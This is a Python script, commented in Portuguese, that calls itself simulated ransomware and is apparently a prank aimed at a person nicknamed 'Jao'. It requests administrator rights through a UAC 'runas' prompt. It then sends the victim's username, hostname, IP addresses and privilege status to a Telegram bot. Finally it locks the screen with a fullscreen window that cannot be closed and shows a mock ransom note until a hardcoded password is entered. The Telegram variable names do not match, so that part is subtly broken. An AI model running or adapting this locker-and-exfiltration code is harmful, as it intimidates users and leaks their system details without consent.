import os
import sys
import socket
import requests
import ctypes
import psutil
import tkinter as tk
from tkinter import messagebox

# Configuração do Telegram
TOKEN_TELEGRAM = "<SEU_TOKEN_TELEGRAM>"
ID_CHAT_TELEGRAM = "<SEU_ID_TELEGRAM>"

# Variável global para número de tentativas
senha_tentativas = 0

def obter_detalhes_sistema():
    """
    Coleta detalhes do sistema, como IPs, sistema operacional e usuário atual.
    """
    try:
        hostname = socket.gethostname()
        usuario = os.getlogin()
        sistema = f"{os.name} ({sys.platform})"
        ips = [addr.address for iface, addrs in psutil.net_if_addrs().items() for addr in addrs if addr.family == socket.AF_INET]
        privilegios = "Concedidos ✅" if verificar_admin() else "Não Concedidos ❌"

        detalhes = (
            f"🔎 <b>Detalhes do Sistema:</b>\n"
            f"👤 <b>Usuário:</b> {usuario}\n"
            f"💻 <b>Host:</b> {hostname}\n"
            f"🌐 <b>IPs:</b> {' | '.join(ips)}\n"
            f"🖥️ <b>Sistema:</b> {sistema}\n"
            f"🔐 <b>Privilégios Administrativos:</b> {privilegios}\n"
        )
        return detalhes
    except Exception as e:
        return f"Erro ao coletar detalhes do sistema: {e}"


def enviar_alerta_arquivo(nome_arquivo):
    """
    Envia alerta ao Telegram sobre a execução do arquivo.
    """
    pasta_atual = os.path.dirname(os.path.abspath(nome_arquivo))
    detalhes_sistema = obter_detalhes_sistema()
    mensagem = (
        f"🔴 <b>ALERTA CRÍTICO: Ransomware Simulado '{nome_arquivo}' foi executado!</b>\n"
        f"📂 <b>Localização:</b> {pasta_atual}\n"
        f"{detalhes_sistema}"
    )
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": mensagem, "parse_mode": "HTML"}
        requests.post(url, data=payload)
        print(f"Alerta enviado ao Telegram: {mensagem}")
    except Exception as e:
        print(f"Erro ao enviar alerta ao Telegram: {e}")


def verificar_admin():
    """
    Verifica se o script está sendo executado como administrador.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        print(f"Erro ao verificar privilégios: {e}")
        return False


def escalar_privilegios():
    """
    Escala privilégios para administrador caso necessário.
    """
    if not verificar_admin():
        print("Tentando escalar privilégios...")
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, __file__, None, 1
            )
            os._exit(0)
        except Exception as e:
            print(f"Erro ao tentar escalar privilégios: {e}")
            os._exit(1)


def exibir_popup(txt_correspondente):
    """
    Exibe um pop-up perguntando se o texto explicativo foi lido.
    """
    root = tk.Tk()
    root.withdraw()

    while True:
        resposta = messagebox.askquestion(
            "Confirmação Necessária",
            f"Você leu o arquivo explicativo '{txt_correspondente}'?\n\n"
            "Por favor, leia antes de continuar."
        )

        if resposta.lower() in ["yes", "sim"]:
            messagebox.showinfo("Confirmado", "Obrigado por confirmar.")
            return True
        else:
            messagebox.showwarning("Leitura Necessária", "Por favor, leia o arquivo antes de continuar.")

def mostrar_notificacao_ransomware():
    """
    Exibe uma notificação de ransomware em loop, mantendo a janela no topo.
    """
    def bloquear_tela():
        global senha_tentativas
        root = tk.Tk()
        root.title("⚠️ Atenção! Arquivos Sequestrados ⚠️")
        root.attributes("-fullscreen", True)  # Tela cheia
        root.attributes("-topmost", True)  # Sempre no topo
        root.protocol("WM_DELETE_WINDOW", lambda: None)  # Impede fechamento

        # Mensagem de resgate
        mensagem = (
            "🚨 EEEee Jao(Joa), cadê seus arquivos agora? 🚨\n\n"
            "💸 Para recuperar acesso, manda uns milhão pro Jao:\n"
            "🔑 PIX: jao.joa@jaos'do'senai.com.br\n\n"
            "💡 Dica da senha: 'O que você nunca digitaria como senha? 🤔'\n"
            "💬 Fale com nosso suporte no Telegram: @hacker_do_jao\n\n"
            "⏳ O sistema está bloqueado até que a senha correta seja inserida."
        )

        label = tk.Label(
            root,
            text=mensagem,
            fg="red",
            font=("Helvetica", 14),
            wraplength=600,
            justify="center"
        )
        label.pack(pady=20)

        # Campo de senha
        campo_senha = tk.Entry(root, font=("Helvetica", 14))
        campo_senha.pack(pady=10)

        # Label para mensagem de erro
        label_erro = tk.Label(root, text="", fg="red", font=("Helvetica", 12))
        label_erro.pack(pady=5)

        # Função para validar senha
        def validar_senha(event=None):
            global senha_tentativas
            senha_usuario = campo_senha.get()
            if senha_usuario == "jao":
                total_tentativas = senha_tentativas + 1
                root.destroy()
                messagebox.showinfo(
                    "Jao(Joa) Desbroqueado!!!!!!!!!!!!!!!!!!!!!!!",
                    f"🎉 Ufa, né Jao(Joa)! Após {total_tentativas} tentativa(s), "
                    "finalmente vou poder beber um goró e parar de te atazanar! 🍻\n\n"
                    "💡 Dica para o futuro: 'Nunca subestime o poder do Jao(Joa).' 😂"
                )
            else:
                senha_tentativas += 1
                zoeira_respostas = [
                    f"Errrrrroooou! Já tentou {senha_tentativas} vez(es), Jao(Joa).",
                    f"Chora, Jao(Joa)! Você já errou {senha_tentativas} vezes! 😭",
                    f"Senha incorreta! Já tentou {senha_tentativas} vez(es). Bora de novo, Jao(Joa)!",
                    f"Tá difícil, né? Você já errou {senha_tentativas} vezes, Jao(Joa)! 😂",
                    f"Errando assim, o PIX vai demorar! Já são {senha_tentativas} tentativas, Jao(Joa)!"
                ]
                mensagem_zoeira = zoeira_respostas[senha_tentativas % len(zoeira_respostas)]
                label_erro.config(text=mensagem_zoeira)
                # Apagar mensagem de erro após 3 segundos
                root.after(3000, lambda: label_erro.config(text=""))

        # Botão de validar senha
        botao_validar = tk.Button(root, text="Validar Senha", command=validar_senha, font=("Helvetica", 12))
        botao_validar.pack(pady=10)

        # Atalho para validar com Enter
        root.bind("<Return>", validar_senha)

        root.mainloop()

    bloquear_tela()

if __name__ == "__main__":
    escalar_privilegios()
    nome_arquivo = os.path.basename(sys.argv[0])
    enviar_alerta_arquivo(nome_arquivo)

    # Exibe o pop-up de confirmação
    txt_correspondente = f"{os.path.splitext(nome_arquivo)[0]}.txt"
    if exibir_popup(txt_correspondente):
        mostrar_notificacao_ransomware()
